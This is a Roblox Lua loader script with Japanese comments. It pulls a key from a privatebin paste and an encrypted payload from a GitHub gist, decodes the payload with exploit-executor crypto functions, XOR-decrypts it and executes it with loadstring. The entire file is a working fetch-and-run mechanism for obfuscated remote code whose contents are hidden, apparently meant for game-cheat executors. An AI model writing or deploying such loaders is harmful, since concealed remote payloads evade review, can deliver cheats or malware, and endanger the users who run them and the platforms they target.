local http = game:GetService("HttpService")

-- 🔑 別サーバーからキーを取得
local keyUrl = "https://privatebin.net/?2f0d5f288a858b23#CFjo6NkH8pmC7oY44rRxQ4A7ua7QrWN8q93JEYHZT9JP?raw"
local key = game:HttpGet(keyUrl, true):gsub("%s+$", "")
print("🔑 Key:", key)

-- 📜 GitHub Gist から暗号化スクリプトを取得
local encryptedScript = game:HttpGet("https://gist.githubusercontent.com/YomogiBest/346a6505dcd1d8836de79bd127b82898/raw/07ccb4976b85fc9159061d80c81b76aad69a7d/gist", true)
print("🔹 Encrypted Script Length:", #encryptedScript)

-- 🔄 Base64 デコード
local decodedScript
local success, err = pcall(function()
    if syn and syn.crypt and syn.crypt.base64.decode then
        decodedScript = syn.crypt.base64.decode(encryptedScript)
    elseif crypt and crypt.base64decode then
        decodedScript = crypt.base64decode(encryptedScript)
    else
        error("❌ Base64 デコードがサポートされていません！")
    end
end)

if not success then
    error("❌ Base64 Decoding Error: " .. err)
end

-- 🔓 XOR 復号関数
local function xor_decrypt(data, key)
    local result, keyLength = {}, #key
    for i = 1, #data do
        result[i] = string.char(bit32.bxor(data:byte(i), key:byte((i - 1) % keyLength + 1)))
    end
    return table.concat(result)
end

-- 🚀 復号＆実行
local finalScript = xor_decrypt(decodedScript, key)
print("🔓 Decrypted Script Length:", #finalScript)

assert(finalScript and #finalScript > 0, "❌ Decryption failed: Script is empty!")
loadstring(finalScript)()
